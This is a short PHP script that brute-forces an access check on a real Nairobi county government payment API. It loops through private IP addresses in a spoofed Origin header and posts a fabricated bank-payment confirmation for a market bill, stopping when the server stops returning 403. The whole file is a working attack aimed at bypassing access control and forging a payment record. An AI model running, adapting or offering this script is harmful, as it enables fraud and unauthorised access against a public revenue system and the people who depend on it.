<?php

$curl = curl_init();

//echo $response;

for ($i = 116; $i <= 999; $i++) {
    for ($m = 0; $m <= 999; $m++) {

        curl_setopt_array($curl, array(
            CURLOPT_URL => 'https://nairobiservices.go.ke/api/gateway/taifa/nrs/confirm',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'POST',
            CURLOPT_POSTFIELDS => '{
    "bankdetails": {
        "debitCustName": "upoli asa fgs zdbhDF rghdf",
        "bankName": "Cooperative Bank",
        "bankReference": "S16722469_07082023"
    },
    "billNumber": "BL-MT-101372",
    "billAmount": "1000",
    "billType": "market"
}',
            CURLOPT_HTTPHEADER => array(
                'Origin: 192.168.' . $i . '.' . $m,
                'Content-Type: application/json',
                'Cookie: csrftoken=VZ2buILEt0Ir5eJtyJcVFmNMeYzLP1En'
            ),
        ));

        $response = curl_exec($curl);

        // Get the response code
        $http_response_code = curl_getinfo($curl, CURLINFO_RESPONSE_CODE);

        if ($http_response_code != "403") {
            echo 'RESPONSE CODE: ' . $http_response_code . PHP_EOL . 'IP: 192.168.' . $i . '.' . $m;
            die(' - FOUND!!');
        } else {
            echo "Response Code: " . $http_response_code . "\n" . PHP_EOL . 'IP: 192.168.' . $i . '.' . $m. PHP_EOL;
        }
    }
}
curl_close($curl);
